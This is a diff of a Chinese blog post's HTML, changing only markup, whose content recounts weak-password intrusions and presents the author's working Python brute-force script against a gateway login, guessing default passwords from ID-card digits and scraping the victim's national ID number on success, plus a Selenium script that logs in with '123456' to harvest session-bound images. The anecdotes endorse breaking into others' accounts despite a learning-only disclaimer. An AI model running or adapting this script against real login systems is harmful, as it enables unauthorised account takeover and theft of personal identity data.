@@ -183,7 +183,7 @@
             <p>注明：代码仅限学习使用，禁止用作web攻击，一切后果由使用者自负，博主不承担法律责任。</p>
 
 <h1 id="0">
-<a id="0" class="anchor" href="#0" aria-hidden="true"><span class="octicon octicon-link"></span></a>0</h1>
+<a class="anchor" href="#0" aria-hidden="true"><span class="octicon octicon-link"></span></a>0</h1>
 
 <p>弱密码攻击是我能想到的最简单的网安案例了。曾不止一次用123456(78)攻破各种网关、入口、无线接入点等等。前几天报导的2016最差密码中，没有任何争议，这个密码又一次强势登顶。</p>
 
@@ -194,7 +194,7 @@
 <p>以下案例亦真亦幻，就当听个乐儿了~</p>
 
 <h2 id="ab">
-<a id="ab" class="anchor" href="#ab" aria-hidden="true"><span class="octicon octicon-link"></span></a>AB</h2>
+<a class="anchor" href="#ab" aria-hidden="true"><span class="octicon octicon-link"></span></a>AB</h2>
 
 <p>A君想从B处拿到一些文件，但又不想留下太多痕迹，希望给B一个惊喜？A首先尝试了合理手段去获得线索。放狗一搜，的确有一堆结果；一一看过来，却发现没一个有用。甚至他天真地用关键词+download的方法去搜索，得到的无非是一堆广告链接和挂马网站而已。</p>
 
@@ -207,7 +207,7 @@
 <p><img src="/images/201702/A1.png" alt="Cleartext Password"></p>
 
 <h2 id="cd">
-<a id="cd" class="anchor" href="#cd" aria-hidden="true"><span class="octicon octicon-link"></span></a>CD</h2>
+<a class="anchor" href="#cd" aria-hidden="true"><span class="octicon octicon-link"></span></a>CD</h2>
 
 <p>C君想登录一个网站，但没有用户名和密码。怎么办呢？他以游客身份看到了最近访问用户列表。上面有十几个用户名。没有什么方法，一个个试过去，用户名和密码填成一样。哈！居然还真有人这么设定！登上去以后，自然而然更多的信息就到手咯~</p>
 
@@ -216,70 +216,70 @@
 <p>D君比C君更懂得电脑技术一些。他也想进入一个网站。不同的是，那个网站的安全性更好一些，密码输错10次就会锁定IP。D君便理所应当地想到封掉一个换一个不就完了啦。他还知道社工的强大，花费不多就能得到更加准确的数据。哈！找到一个有意思的条目……</p>
 
 <h2 id="e">
-<a id="e" class="anchor" href="#e" aria-hidden="true"><span class="octicon octicon-link"></span></a>E</h2>
+<a class="anchor" href="#e" aria-hidden="true"><span class="octicon octicon-link"></span></a>E</h2>
 
 <p>E比较有才，熟知Windows、Linux、Mac、Android、IOS、WP8等系统的开关机。他能直接写出一个链接来，直捣黄龙拿到那个文件。笔者看了E的做法后大为惊叹，学着也照猫画虎干了些人畜无害的事情~</p>
 
 <p><img src="/images/201702/E1.png" alt="Usr = Pwd"></p>
 
 <h2 id="f">
-<a id="f" class="anchor" href="#f" aria-hidden="true"><span class="octicon octicon-link"></span></a>F</h2>
+<a class="anchor" href="#f" aria-hidden="true"><span class="octicon octicon-link"></span></a>F</h2>
 
 <p>可得好好说说F，他是123456走天下的先驱人物，挂在嘴边上的名言：“喜欢就买，不行就分，多喝热水，重启试试”早已被奉为警句。碰巧通过123456拿到一个su后一发不可收拾，看到了许多不该看的东西。</p>
 
 <p><img src="/images/201702/yooo.jpg" alt="Yoooo~"></p>
 
 <h1 id="1">
-<a id="1" class="anchor" href="#1" aria-hidden="true"><span class="octicon octicon-link"></span></a>1</h1>
+<a class="anchor" href="#1" aria-hidden="true"><span class="octicon octicon-link"></span></a>1</h1>
 
 <p>说说正经事。上面都是我见过或者道听途说的事情，但自己还没有真正试过做点什么。恰巧遇到一个网关没有验证码没有相应的阻断策略，干脆用Python练练手，写个小程序试一下。</p>
 
 <p>已知条件：用户名是十位数，密码是六位数，默认密码为身份证后六位</p>
 
 <h2 id="身份证">
-<a id="身份证" class="anchor" href="#%E8%BA%AB%E4%BB%BD%E8%AF%81" aria-hidden="true"><span class="octicon octicon-link"></span></a>身份证</h2>
+<a class="anchor" href="#%E8%BA%AB%E4%BB%BD%E8%AF%81" aria-hidden="true"><span class="octicon octicon-link"></span></a>身份证</h2>
 
 <p>我们都知道，身份证的18位数字是很有规律的：省市年月序号性别校验。只是现在我们不需要根据已知数位求身份证，而需要枚举出所有可行的后六位数值来。</p>
 
 <p>如果没有限制条件，数量也太大了。31 * 10000，显然不可行。最好能把字典大小控制在1E3量级，这样也方便测试。分析可知，前两位生日可以通过一些社工方法拿到，性别可以通过规律得到。这样的话，得到的条目显著减少了。</p>
 
 <h2 id="post数据构造">
-<a id="post数据构造" class="anchor" href="#post%E6%95%B0%E6%8D%AE%E6%9E%84%E9%80%A0" aria-hidden="true"><span class="octicon octicon-link"></span></a>POST数据构造</h2>
+<a class="anchor" href="#post%E6%95%B0%E6%8D%AE%E6%9E%84%E9%80%A0" aria-hidden="true"><span class="octicon octicon-link"></span></a>POST数据构造</h2>
 
 <p>直接F12看一下正常访问是怎样的……然后一条一条删掉没影响的，最后留下精简的数据即可。</p>
 
 <h2 id="生日">
-<a id="生日" class="anchor" href="#%E7%94%9F%E6%97%A5" aria-hidden="true"><span class="octicon octicon-link"></span></a>生日</h2>
+<a class="anchor" href="#%E7%94%9F%E6%97%A5" aria-hidden="true"><span class="octicon octicon-link"></span></a>生日</h2>
 
 <p>可惜没法直接知道一个陌生人的生日。只好拿自己的生日做实验了。</p>
 
 <h2 id="多线程">
-<a id="多线程" class="anchor" href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B" aria-hidden="true"><span class="octicon octicon-link"></span></a>多线程</h2>
+<a class="anchor" href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B" aria-hidden="true"><span class="octicon octicon-link"></span></a>多线程</h2>
 
 <p>尽管Python的多线程不太有效，实际上还是单核执行，但对于IO密集型操作应该还是有些效果。我尝试了最简单的Threadding模块，运行后发现还没有顺序执行来得快呢。或许对于一些更复杂的、需要载入更多内容的访问，多线程更适合吧。</p>
 
 <h2 id="其它">
-<a id="其它" class="anchor" href="#%E5%85%B6%E5%AE%83" aria-hidden="true"><span class="octicon octicon-link"></span></a>其它</h2>
+<a class="anchor" href="#%E5%85%B6%E5%AE%83" aria-hidden="true"><span class="octicon octicon-link"></span></a>其它</h2>
 
 <p>测试中发现用外网IP连接不太稳定，会报errno 10060，又不愿意加sleep，干脆想了别的办法。最后大概每秒钟3-5条的频率，不算太快，折衷办法。</p>
 
 <h2 id="结果">
-<a id="结果" class="anchor" href="#%E7%BB%93%E6%9E%9C" aria-hidden="true"><span class="octicon octicon-link"></span></a>结果</h2>
+<a class="anchor" href="#%E7%BB%93%E6%9E%9C" aria-hidden="true"><span class="octicon octicon-link"></span></a>结果</h2>
 
 <p>花费不到一分钟试出了自己的密码。</p>
 
 <h1 id="2">
-<a id="2" class="anchor" href="#2" aria-hidden="true"><span class="octicon octicon-link"></span></a>2</h1>
+<a class="anchor" href="#2" aria-hidden="true"><span class="octicon octicon-link"></span></a>2</h1>
 
 <h2 id="执着的图片">
-<a id="执着的图片" class="anchor" href="#%E6%89%A7%E7%9D%80%E7%9A%84%E5%9B%BE%E7%89%87" aria-hidden="true"><span class="octicon octicon-link"></span></a>执着的图片</h2>
+<a class="anchor" href="#%E6%89%A7%E7%9D%80%E7%9A%84%E5%9B%BE%E7%89%87" aria-hidden="true"><span class="octicon octicon-link"></span></a>执着的图片</h2>
 
 <p>其实今天本来有正事儿相干的，结果一坐在电脑前就忍不住调程序。又写了个奇怪的需求。这次的需求是图片访问基于用户session，改变了就没法访问这张图片。（其实是可以的，只不过我懒得分析POST到底是什么流程，索性用拟人的方法来强行自动化）类似的情况有动态验证码生成——如果request了图片就会刷新。</p>
 
 <p>明显就是一个利用selenium进行自动化的过程，但编程中遇到了一些小问题：selenium的确能保持session的状态，但它GET图片后并没法保存。如果是人手动操作的话，此时应该是通过右键另存为或者CTRL+S，不过程序并不能轻易地做到这一点。</p>
 
 <h2 id="按键操作">
-<a id="按键操作" class="anchor" href="#%E6%8C%89%E9%94%AE%E6%93%8D%E4%BD%9C" aria-hidden="true"><span class="octicon octicon-link"></span></a>按键操作</h2>
+<a class="anchor" href="#%E6%8C%89%E9%94%AE%E6%93%8D%E4%BD%9C" aria-hidden="true"><span class="octicon octicon-link"></span></a>按键操作</h2>
 
 <p>走了一点小弯路，想着用浏览器的模拟按键来操作。后来发现得使用winAPI模拟按键。CTRL+S之后，弹出的保存文件框再次超出了Python的适用范围，于是上stackoverflow一搜，发现了两种及其不优雅的解决方案……（没办法，谁让这个需求本来就很别扭呢）</p>
 
@@ -288,19 +288,19 @@
 <p>一种是通过Python输入前两个键，Autoit输入ENTER键来模拟；另一种是全屏截图然后根据获得的图片坐标进行裁剪……权衡了规模和实现难度后选择了第一种。</p>
 
 <h2 id="结果-1">
-<a id="结果-1" class="anchor" href="#%E7%BB%93%E6%9E%9C-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>结果</h2>
+<a class="anchor" href="#%E7%BB%93%E6%9E%9C-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>结果</h2>
 
 <p>得到了一堆图片</p>
 
 <h1 id="代码">
-<a id="代码" class="anchor" href="#%E4%BB%A3%E7%A0%81" aria-hidden="true"><span class="octicon octicon-link"></span></a>代码</h1>
+<a class="anchor" href="#%E4%BB%A3%E7%A0%81" aria-hidden="true"><span class="octicon octicon-link"></span></a>代码</h1>
 
 <h2 id="1-1">
-<a id="1-1" class="anchor" href="#1-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>1</h2>
+<a class="anchor" href="#1-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>1</h2>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -*- coding: utf-8 -*-</span>
-<span class="kn">import</span> <span class="nn">httplib</span><span class="p">,</span> <span class="n">urllib</span> <span class="p">,</span> <span class="n">cookielib</span><span class="p">,</span> <span class="n">urllib2</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">time</span>  <span class="c">#, threading</span>
-<span class="n">path</span> <span class="o">=</span> <span class="s">'http://xxxx/dologin.php'</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding: utf-8 -*-
+</span><span class="kn">import</span> <span class="nn">httplib</span><span class="p">,</span> <span class="n">urllib</span> <span class="p">,</span> <span class="n">cookielib</span><span class="p">,</span> <span class="n">urllib2</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">time</span>  <span class="c1">#, threading
+</span><span class="n">path</span> <span class="o">=</span> <span class="s">'http://xxxx/dologin.php'</span>
 <span class="n">path2</span> <span class="o">=</span> <span class="s">'http://xxxx/selfinfor.php'</span>
 <span class="n">stuid</span> <span class="o">=</span> <span class="s">'20xxxxxxxx'</span>
 <span class="n">pwdtext</span> <span class="o">=</span> <span class="s">'xxxx.txt'</span>
@@ -311,38 +311,38 @@
         <span class="s">'ID'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
         <span class="s">'Password'</span><span class="p">:</span> <span class="n">password</span>
         <span class="p">}</span>
-    <span class="n">cj</span> <span class="o">=</span> <span class="n">cookielib</span><span class="o">.</span><span class="n">CookieJar</span><span class="p">()</span>  
-    <span class="n">post_data</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  
+    <span class="n">cj</span> <span class="o">=</span> <span class="n">cookielib</span><span class="p">.</span><span class="n">CookieJar</span><span class="p">()</span>  
+    <span class="n">post_data</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  
     <span class="n">UserAgent</span> <span class="o">=</span> <span class="s">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36'</span>
     <span class="k">for</span> <span class="n">tries</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
         <span class="k">try</span><span class="p">:</span>
-            <span class="n">opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPCookieProcessor</span><span class="p">(</span><span class="n">cj</span><span class="p">))</span>  
-            <span class="n">opener</span><span class="o">.</span><span class="n">addheaders</span> <span class="o">=</span> <span class="p">[(</span><span class="s">'User-Agent'</span><span class="p">,</span> <span class="n">UserAgent</span><span class="p">)]</span>
-            <span class="n">urllib2</span><span class="o">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">opener</span><span class="p">)</span>  
-            <span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">post_data</span><span class="p">)</span>  
-            <span class="n">conn</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">6</span><span class="p">)</span>
-            <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-            <span class="c"># print res</span>
-            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-            <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">"用户名或密码错误"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>        
+            <span class="n">opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">urllib2</span><span class="p">.</span><span class="n">HTTPCookieProcessor</span><span class="p">(</span><span class="n">cj</span><span class="p">))</span>  
+            <span class="n">opener</span><span class="p">.</span><span class="n">addheaders</span> <span class="o">=</span> <span class="p">[(</span><span class="s">'User-Agent'</span><span class="p">,</span> <span class="n">UserAgent</span><span class="p">)]</span>
+            <span class="n">urllib2</span><span class="p">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">opener</span><span class="p">)</span>  
+            <span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">post_data</span><span class="p">)</span>  
+            <span class="n">conn</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">6</span><span class="p">)</span>
+            <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+            <span class="c1"># print res
+</span>            <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"用户名或密码错误"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>        
                 <span class="k">print</span> <span class="s">'now: '</span> <span class="o">+</span> <span class="n">password</span>
                 <span class="k">return</span> <span class="bp">False</span>
             <span class="k">else</span><span class="p">:</span>
-                <span class="n">conn2</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">path2</span><span class="p">)</span>
-                <span class="n">res2</span> <span class="o">=</span> <span class="n">conn2</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-                <span class="n">conn2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                <span class="n">conn2</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">path2</span><span class="p">)</span>
+                <span class="n">res2</span> <span class="o">=</span> <span class="n">conn2</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+                <span class="n">conn2</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                 <span class="n">regx</span>  <span class="o">=</span> <span class="s">r'&lt;tr&gt;&lt;th&gt;身份证号:&lt;/th&gt;&lt;td&gt;(.*)&lt;/td&gt;&lt;/tr&gt;'</span>
-                <span class="c"># idnumre = '^\d{15}(\d{2}[0-9xX])?$'</span>
-                <span class="c">#for line in res2:</span>
-                  <span class="c">#  if re.search(idnumre , line):</span>
-                <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">regx</span><span class="p">,</span> <span class="n">res2</span><span class="p">)</span>
+                <span class="c1"># idnumre = '^\d{15}(\d{2}[0-9xX])?$'
+</span>                <span class="c1">#for line in res2:
+</span>                  <span class="c1">#  if re.search(idnumre , line):
+</span>                <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">regx</span><span class="p">,</span> <span class="n">res2</span><span class="p">)</span>
                 <span class="k">print</span> <span class="s">'pwd: '</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="s">' usr: '</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span>  <span class="s">' ID number '</span> <span class="o">+</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                 <span class="n">outFile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'result '</span><span class="o">+</span><span class="n">username</span><span class="o">+</span><span class="s">'.txt'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
-                <span class="n">outFile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'pwd: '</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="o">+</span> <span class="s">' usr: '</span> <span class="o">+</span> <span class="n">stuid</span> <span class="o">+</span>  <span class="s">' ID number '</span> <span class="o">+</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-                <span class="n">outFile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-                    <span class="c">#else:</span>
-                      <span class="c">#  continue</span>
-                <span class="k">return</span> <span class="bp">True</span>
+                <span class="n">outFile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'pwd: '</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="o">+</span> <span class="s">' usr: '</span> <span class="o">+</span> <span class="n">stuid</span> <span class="o">+</span>  <span class="s">' ID number '</span> <span class="o">+</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+                <span class="n">outFile</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+                    <span class="c1">#else:
+</span>                      <span class="c1">#  continue
+</span>                <span class="k">return</span> <span class="bp">True</span>
         <span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span> 
             <span class="k">print</span> <span class="nb">Exception</span><span class="p">,</span><span class="s">":"</span><span class="p">,</span><span class="n">e</span>
             
@@ -373,18 +373,18 @@ if __name__ == '__main__':
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
     <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">pwdtext</span><span class="p">)</span> <span class="k">as</span> <span class="n">pwdfile</span><span class="p">:</span>
          <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pwdfile</span><span class="p">:</span>
-            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-            <span class="k">if</span> <span class="n">Check</span><span class="p">(</span><span class="n">stuid</span><span class="p">,</span><span class="n">i</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()):</span>
+            <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">Check</span><span class="p">(</span><span class="n">stuid</span><span class="p">,</span><span class="n">i</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()):</span>
                 <span class="k">break</span>
 
 </code></pre></div></div>
 
 <h2 id="2-1">
-<a id="2-1" class="anchor" href="#2-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>2</h2>
+<a class="anchor" href="#2-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>2</h2>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="c"># -*- coding: utf-8 -*-</span>
-<span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="c1"># -*- coding: utf-8 -*-
+</span><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
 <span class="kn">from</span> <span class="nn">selenium.common.exceptions</span> <span class="kn">import</span> <span class="n">TimeoutException</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="kn">import</span> <span class="nn">os</span>
@@ -396,30 +396,30 @@ if __name__ == '__main__':
 <span class="n">pwdtext</span> <span class="o">=</span> <span class="s">'123456'</span>
 <span class="n">link</span> <span class="o">=</span> <span class="s">'list2.txt'</span>
 
-<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
-<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">site</span><span class="p">)</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">driver</span><span class="o">.</span><span class="n">find_element_by_name</span><span class="p">(</span><span class="s">"userName"</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">stuid</span><span class="p">)</span>
-<span class="n">driver</span><span class="o">.</span><span class="n">find_element_by_name</span><span class="p">(</span><span class="s">"password"</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">pwdtext</span><span class="p">)</span>
-<span class="n">driver</span><span class="o">.</span><span class="n">find_element_by_name</span><span class="p">(</span><span class="s">"btn"</span><span class="p">)</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="n">Chrome</span><span class="p">()</span>
+<span class="n">driver</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">site</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="n">find_element_by_name</span><span class="p">(</span><span class="s">"userName"</span><span class="p">).</span><span class="n">send_keys</span><span class="p">(</span><span class="n">stuid</span><span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="n">find_element_by_name</span><span class="p">(</span><span class="s">"password"</span><span class="p">).</span><span class="n">send_keys</span><span class="p">(</span><span class="n">pwdtext</span><span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="n">find_element_by_name</span><span class="p">(</span><span class="s">"btn"</span><span class="p">).</span><span class="n">click</span><span class="p">()</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
 <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">link</span><span class="p">)</span> <span class="k">as</span> <span class="n">pwdfile</span><span class="p">:</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pwdfile</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pwdfile</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
         <span class="k">for</span> <span class="n">tries</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
             <span class="k">try</span><span class="p">:</span>
-                <span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-                <span class="c">#driver.save_screenshot(i[-14:])</span>
-                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-                <span class="n">win32api</span><span class="o">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>  <span class="c">#ctrl键位码是17</span>
-                <span class="n">win32api</span><span class="o">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">83</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>  <span class="c">#s键位码是83</span>
-                <span class="n">win32api</span><span class="o">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">83</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">win32con</span><span class="o">.</span><span class="n">KEYEVENTF_KEYUP</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c">#s释放按键</span>
-                <span class="n">win32api</span><span class="o">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">win32con</span><span class="o">.</span><span class="n">KEYEVENTF_KEYUP</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
-                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-                <span class="c">#win32api.keybd_event(16,0,0,0)</span>
-                <span class="c">#win32api.keybd_event(16,0,win32con.KEYEVENTF_KEYUP,0)</span>
-                <span class="n">win32api</span><span class="o">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'open'</span><span class="p">,</span> <span class="s">'saveas.exe'</span><span class="p">,</span> <span class="s">''</span><span class="p">,</span><span class="s">''</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c">#autoit</span>
-                <span class="k">print</span> <span class="s">'success'</span>
+                <span class="n">driver</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                <span class="c1">#driver.save_screenshot(i[-14:])
+</span>                <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                <span class="n">win32api</span><span class="p">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">#ctrl键位码是17
+</span>                <span class="n">win32api</span><span class="p">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">83</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">#s键位码是83
+</span>                <span class="n">win32api</span><span class="p">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">83</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">win32con</span><span class="p">.</span><span class="n">KEYEVENTF_KEYUP</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#s释放按键
+</span>                <span class="n">win32api</span><span class="p">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">win32con</span><span class="p">.</span><span class="n">KEYEVENTF_KEYUP</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+                <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+                <span class="c1">#win32api.keybd_event(16,0,0,0)
+</span>                <span class="c1">#win32api.keybd_event(16,0,win32con.KEYEVENTF_KEYUP,0)
+</span>                <span class="n">win32api</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'open'</span><span class="p">,</span> <span class="s">'saveas.exe'</span><span class="p">,</span> <span class="s">''</span><span class="p">,</span><span class="s">''</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#autoit
+</span>                <span class="k">print</span> <span class="s">'success'</span>
                 <span class="k">break</span>
                 <span class="s">'''
                 with open(i[-14:],'wb') as code:
@@ -435,7 +435,7 @@ if __name__ == '__main__':
 
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//autoit代码
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//autoit代码
 WinWaitActive("另存为")
 Send("{ENTER}")
 </code></pre></div></div>
